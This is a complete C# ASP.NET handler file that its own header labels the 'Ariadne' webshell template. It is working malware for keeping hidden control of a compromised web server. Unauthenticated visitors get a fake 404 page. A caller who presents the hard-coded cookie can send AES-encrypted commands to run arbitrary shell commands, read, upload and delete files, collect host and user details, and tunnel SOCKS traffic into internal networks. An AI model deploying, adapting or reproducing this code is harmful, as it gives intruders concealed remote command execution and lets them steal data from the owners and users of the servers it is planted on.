<%@ WebHandler Language="C#" Class="AriadneHandler" %>

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Web;
using System.Web.SessionState;
using System.Xml;

/// <summary>
/// Ariadne ASHX webshell template
/// Tokens replaced at build time.
/// </summary>
public class AriadneHandler : IHttpHandler, IRequiresSessionState
{
    // =========================================================================
    // BUILD-TIME CONFIGURATION TOKENS
    // =========================================================================

    private static readonly string ARIADNE_UUID = "9a976322-67b5-46e8-95e0-d8c1ff52b329";
    private static readonly string ARIADNE_AUTH_METHOD = "cookie";
    private static readonly string ARIADNE_AUTH_NAME = "ARIADNE_SID";
    private static readonly string ARIADNE_AUTH_VALUE = "ariadne-ashx-final";
    private static readonly string ARIADNE_ENCODING = "deformed_base64";
    private static readonly string ARIADNE_DEFORMED_ALPHABET = "dZT31vADE2XShu+f6wn4/OHUeKNiBcgqyxl0boGRmjJrs5MVCapLzFt8PWQk97YI";
    private static readonly string ARIADNE_STANDARD_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    private static readonly string ARIADNE_ENCRYPTION = "aes256_cbc";
    private static readonly string ARIADNE_AES_KEY = "cwtoVVAnP7rKX5bpU8TRqLi4HlHsU8kfAKjloAywUyc=";
    private static readonly string ARIADNE_REQUEST_TEMPLATE = "form_post";
    private static readonly string ARIADNE_REQUEST_PARAM = "data";
    private static readonly string ARIADNE_CAMOUFLAGE_HTML = "<!DOCTYPE html>\n<html>\n<head><title>404 - File or directory not found.</title>\n<style>body{font-family:\"Segoe UI\",Tahoma,Arial,sans-serif;margin:0;background:#eee}\n.container{max-width:800px;margin:50px auto;background:#fff;border:1px solid #ddd;padding:40px}\nh1{color:#c00;font-size:24px;border-bottom:1px solid #ccc;padding-bottom:10px}\nh2{color:#555;font-size:16px;font-weight:normal}\np{color:#777;font-size:13px;line-height:1.6}</style></head>\n<body><div class=\"container\">\n<h1>Server Error</h1>\n<h2>404 - File or directory not found.</h2>\n<p>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</p>\n</div></body></html>\n";
    private static readonly int ARIADNE_RESPONSE_STATUS = 200;
    private static readonly string ARIADNE_RESPONSE_CT = "text/html";
    private static readonly bool ARIADNE_ENABLE_SOCKS = false;
    private static readonly bool ARIADNE_ENABLE_P2P_HTTP = false;
    private static readonly bool ARIADNE_ENABLE_P2P_TCP = false;
    private static readonly int ARIADNE_TCP_PORT = 7443;
    private static readonly bool ARIADNE_DEBUG = true;

    // =========================================================================
    // SOCKS TUNNEL STATE (static, shared across requests)
    // =========================================================================

    private static readonly Dictionary<string, TcpClient> _tunnels = new Dictionary<string, TcpClient>();
    private static readonly object _tunnelLock = new object();

    // =========================================================================
    // P2P QUEUE (file-based)
    // =========================================================================

    private static string P2PQueueFile
    {
        get
        {
            string hash;
            using (var md5 = MD5.Create())
            {
                byte[] hb = md5.ComputeHash(Encoding.UTF8.GetBytes(ARIADNE_UUID));
                hash = BitConverter.ToString(hb).Replace("-", "").ToLowerInvariant();
            }
            return Path.Combine(Path.GetTempPath(), ".ariadne_p2p_" + hash);
        }
    }

    // =========================================================================
    // IHttpHandler
    // =========================================================================

    public bool IsReusable { get { return true; } }

    public void ProcessRequest(HttpContext context)
    {
        // --- Authentication ---
        if (!Authenticate(context))
        {
            int code = (ARIADNE_RESPONSE_STATUS == 200) ? 404 : ARIADNE_RESPONSE_STATUS;
            context.Response.StatusCode = code;
            context.Response.Write(ARIADNE_CAMOUFLAGE_HTML);
            return;
        }

        // --- Extract payload ---
        string encodedPayload = ExtractPayload(context);
        if (string.IsNullOrEmpty(encodedPayload))
        {
            context.Response.StatusCode = ARIADNE_RESPONSE_STATUS;
            context.Response.ContentType = ARIADNE_RESPONSE_CT;
            context.Response.Write(ARIADNE_CAMOUFLAGE_HTML);
            return;
        }

        // --- Decode ---
        byte[] raw = Decode(encodedPayload);

        // --- Decrypt ---
        byte[] plainBytes = Decrypt(raw);
        if (plainBytes == null)
        {
            context.Response.StatusCode = 500;
            return;
        }

        string plaintext = Encoding.UTF8.GetString(plainBytes);

        // --- Parse pipe protocol ---
        string[] parts = plaintext.Split(new char[] { '|' });
        string action = parts.Length > 0 ? parts[0] : "";
        string taskId = parts.Length > 1 ? parts[1] : "";

        string response = "";

        // --- Dispatch ---
        switch (action)
        {
            case "checkin":
                response = CmdCheckin(taskId);
                break;

            case "shell":
                string command = parts.Length > 2
                    ? string.Join("|", parts, 2, parts.Length - 2)
                    : "";
                response = CmdShell(taskId, command);
                break;

            case "ls":
                string lsPath = parts.Length > 2 ? parts[2] : ".";
                response = CmdLs(taskId, lsPath);
                break;

            case "cd":
                string cdPath = parts.Length > 2 ? parts[2] : ".";
                response = CmdCd(taskId, cdPath);
                break;

            case "pwd":
                response = CmdPwd(taskId);
                break;

            case "download":
                string dlPath = parts.Length > 2 ? parts[2] : "";
                response = CmdDownload(taskId, dlPath);
                break;

            case "upload":
                string upPath = parts.Length > 2 ? parts[2] : "";
                string b64Content = parts.Length > 3 ? parts[3] : "";
                response = CmdUpload(taskId, upPath, b64Content);
                break;

            case "rm":
                string rmPath = parts.Length > 2 ? parts[2] : "";
                response = CmdRm(taskId, rmPath);
                break;

            case "tunnel":
                if (ARIADNE_ENABLE_SOCKS)
                {
                    string mark = parts.Length > 1 ? parts[1] : "";
                    string tunnelCmd = parts.Length > 2 ? parts[2] : "";
                    string tunnelData = parts.Length > 3 ? parts[3] : "";
                    switch (tunnelCmd)
                    {
                        case "CONNECT":
                            response = TunnelConnect(mark, tunnelData);
                            break;
                        case "FORWARD":
                            response = TunnelForward(mark, tunnelData);
                            break;
                        case "READ":
                            response = TunnelRead(mark);
                            break;
                        case "DISCONNECT":
                            response = TunnelDisconnect(mark);
                            break;
                        default:
                            response = "1|Unknown tunnel command: " + tunnelCmd;
                            break;
                    }
                }
                else
                {
                    response = "1|SOCKS tunneling not enabled";
                }
                break;

            case "poll":
            case "poll_p2p":
                string p2pData = "";
                if (ARIADNE_ENABLE_P2P_HTTP && action == "poll_p2p")
                {
                    p2pData = P2PQueueDrain();
                }
                response = "0|poll|" + p2pData;
                break;

            default:
                response = "1|" + taskId + "|Unknown action: " + action;
                break;
        }

        // --- Encrypt ---
        byte[] encryptedBytes = Encrypt(Encoding.UTF8.GetBytes(response));

        // --- Encode ---
        string encodedResponse = Encode(encryptedBytes);

        // --- Write response ---
        context.Response.StatusCode = ARIADNE_RESPONSE_STATUS;
        context.Response.ContentType = ARIADNE_RESPONSE_CT;
        context.Response.Write("<span id=\"r\">" + encodedResponse + "</span>");
    }

    // =========================================================================
    // ENCODING
    // =========================================================================

    private static string Encode(byte[] data)
    {
        if (ARIADNE_ENCODING == "deformed_base64")
        {
            string standard = Convert.ToBase64String(data);
            return StrTr(standard, ARIADNE_STANDARD_ALPHABET, ARIADNE_DEFORMED_ALPHABET);
        }
        else if (ARIADNE_ENCODING == "standard_base64")
        {
            return Convert.ToBase64String(data);
        }
        else if (ARIADNE_ENCODING == "hex")
        {
            return BitConverter.ToString(data).Replace("-", "").ToLowerInvariant();
        }
        return Convert.ToBase64String(data);
    }

    private static byte[] Decode(string encoded)
    {
        if (ARIADNE_ENCODING == "deformed_base64")
        {
            string standard = StrTr(encoded, ARIADNE_DEFORMED_ALPHABET, ARIADNE_STANDARD_ALPHABET);
            return Convert.FromBase64String(standard);
        }
        else if (ARIADNE_ENCODING == "standard_base64")
        {
            return Convert.FromBase64String(encoded);
        }
        else if (ARIADNE_ENCODING == "hex")
        {
            return HexToBytes(encoded);
        }
        return Convert.FromBase64String(encoded);
    }

    private static string StrTr(string input, string from, string to)
    {
        if (from.Length != to.Length) return input;
        var map = new Dictionary<char, char>();
        for (int i = 0; i < from.Length; i++)
        {
            map[from[i]] = to[i];
        }
        var sb = new StringBuilder(input.Length);
        foreach (char c in input)
        {
            sb.Append(map.ContainsKey(c) ? map[c] : c);
        }
        return sb.ToString();
    }

    private static byte[] HexToBytes(string hex)
    {
        byte[] bytes = new byte[hex.Length / 2];
        for (int i = 0; i < bytes.Length; i++)
        {
            bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        }
        return bytes;
    }

    // =========================================================================
    // ENCRYPTION: AES-256-CBC + HMAC-SHA256
    // Format: IV(16) || ciphertext || HMAC(32)
    // =========================================================================

    private static byte[] Encrypt(byte[] plaintext)
    {
        if (ARIADNE_ENCRYPTION != "aes256_cbc" || string.IsNullOrEmpty(ARIADNE_AES_KEY))
        {
            return plaintext;
        }

        byte[] key = Convert.FromBase64String(ARIADNE_AES_KEY);

        byte[] iv = new byte[16];
        using (var rng = new RNGCryptoServiceProvider())
        {
            rng.GetBytes(iv);
        }

        byte[] ciphertext;
        using (var aes = new RijndaelManaged())
        {
            aes.KeySize = 256;
            aes.BlockSize = 128;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = key;
            aes.IV = iv;

            using (var encryptor = aes.CreateEncryptor())
            using (var ms = new MemoryStream())
            {
                using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                {
                    cs.Write(plaintext, 0, plaintext.Length);
                    cs.FlushFinalBlock();
                }
                ciphertext = ms.ToArray();
            }
        }

        // blob = IV || ciphertext
        byte[] blob = new byte[iv.Length + ciphertext.Length];
        System.Buffer.BlockCopy(iv, 0, blob, 0, iv.Length);
        System.Buffer.BlockCopy(ciphertext, 0, blob, iv.Length, ciphertext.Length);

        // HMAC over blob
        byte[] hmac;
        using (var hmacSha256 = new HMACSHA256(key))
        {
            hmac = hmacSha256.ComputeHash(blob);
        }

        // result = blob || HMAC(32)
        byte[] result = new byte[blob.Length + hmac.Length];
        System.Buffer.BlockCopy(blob, 0, result, 0, blob.Length);
        System.Buffer.BlockCopy(hmac, 0, result, blob.Length, hmac.Length);

        return result;
    }

    private static byte[] Decrypt(byte[] blob)
    {
        if (ARIADNE_ENCRYPTION != "aes256_cbc" || string.IsNullOrEmpty(ARIADNE_AES_KEY))
        {
            return blob;
        }

        if (blob.Length < 48) return null; // minimum: 16 IV + 0 ct + 32 HMAC (invalid but guard)

        byte[] key = Convert.FromBase64String(ARIADNE_AES_KEY);

        // Split HMAC (last 32 bytes)
        byte[] hmacReceived = new byte[32];
        System.Buffer.BlockCopy(blob, blob.Length - 32, hmacReceived, 0, 32);

        byte[] ivAndCt = new byte[blob.Length - 32];
        System.Buffer.BlockCopy(blob, 0, ivAndCt, 0, ivAndCt.Length);

        // Verify HMAC (constant-time via ConstantTimeEquals)
        byte[] hmacComputed;
        using (var hmacSha256 = new HMACSHA256(key))
        {
            hmacComputed = hmacSha256.ComputeHash(ivAndCt);
        }

        if (!ConstantTimeEquals(hmacComputed, hmacReceived))
        {
            return null;
        }

        // Extract IV and ciphertext
        byte[] iv = new byte[16];
        System.Buffer.BlockCopy(ivAndCt, 0, iv, 0, 16);

        byte[] ciphertext = new byte[ivAndCt.Length - 16];
        System.Buffer.BlockCopy(ivAndCt, 16, ciphertext, 0, ciphertext.Length);

        // Decrypt
        using (var aes = new RijndaelManaged())
        {
            aes.KeySize = 256;
            aes.BlockSize = 128;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = key;
            aes.IV = iv;

            try
            {
                using (var decryptor = aes.CreateDecryptor())
                using (var ms = new MemoryStream(ciphertext))
                using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                using (var output = new MemoryStream())
                {
                    cs.CopyTo(output);
                    return output.ToArray();
                }
            }
            catch
            {
                return null;
            }
        }
    }

    private static bool ConstantTimeEquals(byte[] a, byte[] b)
    {
        if (a.Length != b.Length) return false;
        int diff = 0;
        for (int i = 0; i < a.Length; i++)
        {
            diff |= a[i] ^ b[i];
        }
        return diff == 0;
    }

    // =========================================================================
    // AUTHENTICATION
    // =========================================================================

    private static bool Authenticate(HttpContext context)
    {
        string value = "";

        if (ARIADNE_AUTH_METHOD == "cookie")
        {
            HttpCookie cookie = context.Request.Cookies[ARIADNE_AUTH_NAME];
            if (cookie != null) value = cookie.Value;
        }
        else if (ARIADNE_AUTH_METHOD == "header")
        {
            value = context.Request.Headers[ARIADNE_AUTH_NAME] ?? "";
        }
        else if (ARIADNE_AUTH_METHOD == "parameter")
        {
            value = context.Request.QueryString[ARIADNE_AUTH_NAME] ?? "";
        }

        return ConstantTimeStringEquals(ARIADNE_AUTH_VALUE, value);
    }

    private static bool ConstantTimeStringEquals(string a, string b)
    {
        if (a == null || b == null) return false;
        byte[] ab = Encoding.UTF8.GetBytes(a);
        byte[] bb = Encoding.UTF8.GetBytes(b);
        if (ab.Length != bb.Length) return false;
        int diff = 0;
        for (int i = 0; i < ab.Length; i++)
        {
            diff |= ab[i] ^ bb[i];
        }
        return diff == 0;
    }

    // =========================================================================
    // REQUEST BODY EXTRACTION
    // =========================================================================

    private static string ExtractPayload(HttpContext context)
    {
        string body;
        using (var reader = new StreamReader(context.Request.InputStream, Encoding.UTF8))
        {
            body = reader.ReadToEnd();
        }

        if (ARIADNE_REQUEST_TEMPLATE == "form_post" || ARIADNE_REQUEST_TEMPLATE == "image_data")
        {
            string val = "";
            string key = Uri.EscapeDataString(ARIADNE_REQUEST_PARAM) + "=";
            foreach (string pair in body.Split('&'))
            {
                if (pair.StartsWith(key, StringComparison.Ordinal))
                {
                    val = Uri.UnescapeDataString(pair.Substring(key.Length).Replace("+", " "));
                    break;
                }
            }

            if (ARIADNE_REQUEST_TEMPLATE == "image_data")
            {
                string prefix = "data:image/png;base64,";
                if (val.StartsWith(prefix, StringComparison.Ordinal))
                {
                    return val.Substring(prefix.Length);
                }
            }
            return val;
        }
        else if (ARIADNE_REQUEST_TEMPLATE == "json_api")
        {
            return JsonExtractValue(body, ARIADNE_REQUEST_PARAM);
        }
        else if (ARIADNE_REQUEST_TEMPLATE == "xml_soap")
        {
            return XmlSoapExtract(body, ARIADNE_REQUEST_PARAM);
        }

        return body;
    }

    /// <summary>
    /// Lightweight JSON value extraction without System.Web.Extensions dependency.
    /// Extracts a top-level string value for the given key.
    /// </summary>
    private static string JsonExtractValue(string json, string key)
    {
        if (string.IsNullOrEmpty(json)) return "";
        // Match "key" : "value" with possible whitespace
        string escaped = Regex.Escape(key);
        var match = Regex.Match(json, "\"" + escaped + "\"\\s*:\\s*\"((?:[^\"\\\\]|\\\\.)*)\"");
        if (match.Success)
        {
            return match.Groups[1].Value
                .Replace("\\\"", "\"")
                .Replace("\\\\", "\\")
                .Replace("\\/", "/")
                .Replace("\\n", "\n")
                .Replace("\\r", "\r")
                .Replace("\\t", "\t");
        }
        return "";
    }

    private static string XmlSoapExtract(string xml, string paramName)
    {
        if (string.IsNullOrEmpty(xml)) return "";
        try
        {
            var doc = new XmlDocument();
            doc.LoadXml(xml);
            var nsMgr = new XmlNamespaceManager(doc.NameTable);
            nsMgr.AddNamespace("soap", "http://schemas.xmlsoap.org/soap/envelope/");
            nsMgr.AddNamespace("soap12", "http://www.w3.org/2003/05/soap-envelope");

            // Try SOAP 1.1
            XmlNode node = doc.SelectSingleNode("//soap:Body/" + paramName, nsMgr);
            if (node != null) return node.InnerText;

            // Try SOAP 1.2
            node = doc.SelectSingleNode("//soap12:Body/" + paramName, nsMgr);
            if (node != null) return node.InnerText;

            // Try without namespace
            node = doc.SelectSingleNode("//*[local-name()='Body']/" + paramName);
            if (node != null) return node.InnerText;

            return "";
        }
        catch
        {
            return "";
        }
    }

    // =========================================================================
    // COMMAND HANDLERS
    // =========================================================================

    private static string CmdCheckin(string taskId)
    {
        string hostname = Environment.MachineName;
        string os = Environment.OSVersion.ToString();
        string user = Environment.UserName;
        string domain = Environment.UserDomainName;
        int pid = Process.GetCurrentProcess().Id;
        string arch = Environment.Is64BitOperatingSystem ? "x86_64" : "x86";
        string cwd = Directory.GetCurrentDirectory();

        string ips = "";
        try
        {
            var addresses = System.Net.Dns.GetHostAddresses(System.Net.Dns.GetHostName());
            ips = string.Join(",", addresses
                .Where(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork
                         || a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6)
                .Select(a => a.ToString()));
        }
        catch { }

        return string.Format("0|{0}|{1}|{2}|{3}|{4}|{5}|{6}|{7}|{8}",
            taskId, hostname, os, user, domain, pid, arch, cwd, ips);
    }

    private static string CmdShell(string taskId, string command)
    {
        try
        {
            bool isWindows = Environment.OSVersion.Platform != PlatformID.Unix
                          && Environment.OSVersion.Platform != PlatformID.MacOSX;

            var psi = new ProcessStartInfo();
            if (isWindows)
            {
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c " + command;
            }
            else
            {
                psi.FileName = "/bin/sh";
                psi.Arguments = "-c \"" + command.Replace("\\", "\\\\").Replace("\"", "\\\"") + "\"";
            }
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.CreateNoWindow = true;

            using (var proc = Process.Start(psi))
            {
                string stdout = proc.StandardOutput.ReadToEnd();
                string stderr = proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                string output = stdout;
                if (!string.IsNullOrEmpty(stderr))
                {
                    output += "\n" + stderr;
                }

                return "0|" + taskId + "|" + output.TrimEnd('\r', '\n');
            }
        }
        catch (Exception ex)
        {
            return "1|" + taskId + "|Shell execution failed: " + ex.Message;
        }
    }

    private static string CmdLs(string taskId, string path)
    {
        try
        {
            if (!Directory.Exists(path))
            {
                return "1|" + taskId + "|Not a directory: " + path;
            }

            var di = new DirectoryInfo(path);
            var entries = new List<string>();

            foreach (var fsi in di.GetFileSystemInfos())
            {
                bool isFile = (fsi.Attributes & FileAttributes.Directory) == 0;
                long size = isFile ? ((FileInfo)fsi).Length : 0;
                string perms = "0000";
                string mtime = fsi.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss");

                // Build JSON object manually to avoid external dependencies
                entries.Add(string.Format(
                    "{{\"name\":\"{0}\",\"is_file\":{1},\"size\":{2},\"permissions\":\"{3}\",\"modify_time\":\"{4}\"}}",
                    JsonEscape(fsi.Name),
                    isFile ? "true" : "false",
                    size,
                    perms,
                    mtime));
            }

            string fullPath = di.FullName;
            string hostname = Environment.MachineName;
            string json = string.Format(
                "{{\"host\":\"{0}\",\"parent_path\":\"{1}\",\"files\":[{2}]}}",
                JsonEscape(hostname),
                JsonEscape(fullPath),
                string.Join(",", entries));

            return "0|" + taskId + "|" + json;
        }
        catch (Exception ex)
        {
            return "1|" + taskId + "|Cannot read directory: " + ex.Message;
        }
    }

    private static string CmdCd(string taskId, string path)
    {
        try
        {
            Directory.SetCurrentDirectory(path);
            return "0|" + taskId + "|" + Directory.GetCurrentDirectory();
        }
        catch
        {
            return "1|" + taskId + "|Cannot change directory to: " + path;
        }
    }

    private static string CmdPwd(string taskId)
    {
        return "0|" + taskId + "|" + Directory.GetCurrentDirectory();
    }

    private static string CmdDownload(string taskId, string filepath)
    {
        try
        {
            if (!File.Exists(filepath))
            {
                return "1|" + taskId + "|File not found: " + filepath;
            }

            byte[] contents = File.ReadAllBytes(filepath);
            string encoded = Convert.ToBase64String(contents);
            string filename = Path.GetFileName(filepath);
            string fullPath = Path.GetFullPath(filepath);

            string json = string.Format(
                "{{\"filename\":\"{0}\",\"filepath\":\"{1}\",\"size\":{2},\"data\":\"{3}\"}}",
                JsonEscape(filename),
                JsonEscape(fullPath),
                contents.Length,
                encoded);

            return "0|" + taskId + "|" + json;
        }
        catch (Exception ex)
        {
            return "1|" + taskId + "|Failed to read file: " + ex.Message;
        }
    }

    private static string CmdUpload(string taskId, string remotePath, string b64Content)
    {
        try
        {
            string dir = Path.GetDirectoryName(remotePath);
            if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
            {
                Directory.CreateDirectory(dir);
            }

            byte[] content = Convert.FromBase64String(b64Content);
            File.WriteAllBytes(remotePath, content);

            return "0|" + taskId + "|Uploaded " + content.Length + " bytes to " + remotePath;
        }
        catch (Exception ex)
        {
            return "1|" + taskId + "|Failed to write file: " + ex.Message;
        }
    }

    private static string CmdRm(string taskId, string path)
    {
        try
        {
            if (File.Exists(path))
            {
                File.Delete(path);
                return "0|" + taskId + "|Removed: " + path;
            }
            else if (Directory.Exists(path))
            {
                Directory.Delete(path, true);
                return "0|" + taskId + "|Removed: " + path;
            }
            else
            {
                return "1|" + taskId + "|Path not found: " + path;
            }
        }
        catch (Exception ex)
        {
            return "1|" + taskId + "|Failed to remove: " + ex.Message;
        }
    }

    // =========================================================================
    // SOCKS TUNNEL HANDLERS
    // =========================================================================

    private static string TunnelConnect(string mark, string data)
    {
        try
        {
            string target = Encoding.UTF8.GetString(Convert.FromBase64String(data));
            string[] parts = target.Split(new char[] { ':' }, 2);
            if (parts.Length != 2)
            {
                return "1|Connection target invalid";
            }

            string ip = parts[0];
            int port = int.Parse(parts[1]);

            var client = new TcpClient();
            client.Connect(ip, port);

            lock (_tunnelLock)
            {
                if (_tunnels.ContainsKey(mark))
                {
                    try { _tunnels[mark].Close(); } catch { }
                }
                _tunnels[mark] = client;
            }

            return "0|Connected";
        }
        catch (Exception ex)
        {
            return "1|Connection failed: " + ex.Message;
        }
    }

    private static string TunnelForward(string mark, string data)
    {
        TcpClient client;
        lock (_tunnelLock)
        {
            if (!_tunnels.TryGetValue(mark, out client))
            {
                return "1|No tunnel session: " + mark;
            }
        }

        try
        {
            if (!client.Connected)
            {
                lock (_tunnelLock) { _tunnels.Remove(mark); }
                return "1|Tunnel closed";
            }

            byte[] raw = Convert.FromBase64String(data);
            NetworkStream stream = client.GetStream();
            stream.Write(raw, 0, raw.Length);

            return "0|" + raw.Length;
        }
        catch
        {
            lock (_tunnelLock) { _tunnels.Remove(mark); }
            try { client.Close(); } catch { }
            return "1|Write failed";
        }
    }

    private static string TunnelRead(string mark)
    {
        TcpClient client;
        lock (_tunnelLock)
        {
            if (!_tunnels.TryGetValue(mark, out client))
            {
                return "1|No tunnel session: " + mark;
            }
        }

        try
        {
            if (!client.Connected)
            {
                lock (_tunnelLock) { _tunnels.Remove(mark); }
                return "1|Tunnel closed";
            }

            NetworkStream stream = client.GetStream();
            byte[] buffer = new byte[8192];
            var result = new MemoryStream();

            // Non-blocking read: consume available data
            while (stream.DataAvailable && result.Length < 524288)
            {
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                if (bytesRead == 0) break;
                result.Write(buffer, 0, bytesRead);
            }

            string encoded = Convert.ToBase64String(result.ToArray());
            return "0|" + encoded;
        }
        catch
        {
            lock (_tunnelLock) { _tunnels.Remove(mark); }
            try { client.Close(); } catch { }
            string encoded = Convert.ToBase64String(new byte[0]);
            return "0|" + encoded;
        }
    }

    private static string TunnelDisconnect(string mark)
    {
        lock (_tunnelLock)
        {
            TcpClient client;
            if (_tunnels.TryGetValue(mark, out client))
            {
                try { client.Close(); } catch { }
                _tunnels.Remove(mark);
            }
        }
        return "0|Disconnected";
    }

    // =========================================================================
    // P2P MESSAGE QUEUE (file-based push/drain)
    // =========================================================================

    private static void P2PQueuePush(string message)
    {
        try
        {
            File.AppendAllText(P2PQueueFile, message + "\n");
        }
        catch { }
    }

    private static string P2PQueueDrain()
    {
        string path = P2PQueueFile;
        if (!File.Exists(path)) return "";
        try
        {
            string data = File.ReadAllText(path);
            File.WriteAllText(path, "");
            return data.Trim();
        }
        catch
        {
            return "";
        }
    }

    // =========================================================================
    // UTILITY
    // =========================================================================

    private static string JsonEscape(string s)
    {
        if (string.IsNullOrEmpty(s)) return "";
        return s
            .Replace("\\", "\\\\")
            .Replace("\"", "\\\"")
            .Replace("\n", "\\n")
            .Replace("\r", "\\r")
            .Replace("\t", "\\t");
    }
}
